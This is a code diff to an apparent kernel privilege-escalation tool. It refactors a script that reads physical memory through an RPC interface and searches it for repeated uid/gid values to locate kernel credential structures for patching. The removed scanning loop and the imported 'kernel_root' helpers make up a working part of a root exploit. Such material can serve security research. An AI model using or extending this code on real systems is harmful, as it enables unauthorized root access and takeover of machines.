@@ -27,7 +27,6 @@ Safety notes:
   * patching is reversible with a reboot; `getuid()` inside the target process is
     the only proof that the right cred was hit.
 """
-import struct
 import sys
 import time
 from pathlib import Path
@@ -37,8 +36,8 @@ sys.path.insert(0, str(Path(__file__).resolve().parent))
 import physmap as T          # noqa: E402
 import kernel_root as K      # noqa: E402
 
-PAT = struct.pack("<8I", 5001, 100, 5001, 100, 5001, 100, 5001, 100)
-PAGE = 0x1000
+PAT = K.OWNER_PAT
+PAGE = K.PAGE
 BATCH = 4096
 DEFAULT_STOP = 0x40000000
 
@@ -57,21 +56,13 @@ def main():
     hits = set()
     try:
         t0 = time.time()
-        page = start
-        scanned = 0
-        while page < stop:
-            count = min(BATCH, (stop - page) // PAGE)
-            for p, data in rpc.readmany(page, count):
-                scanned += 1
-                if data is None:
-                    continue
-                off = data.find(PAT)
-                while off >= 0:
-                    hits.add(p + off - 4)          # ids live at cred+4
-                    off = data.find(PAT, off + 1)
-            page += count * PAGE
+
+        def progress(page, scanned, n):
             print(f"    ... {T.hexs(page)} {scanned} pg {time.time() - t0:.0f}s "
-                  f"{len(hits)} hits", flush=True)
+                  f"{n} hits", flush=True)
+
+        for cred in K.iter_owner_creds(rpc, start, stop, BATCH, progress=progress):
+            hits.add(cred)
         print(f"[*] {len(hits)} cred candidates in {time.time() - t0:.0f}s", flush=True)
 
         rows = []
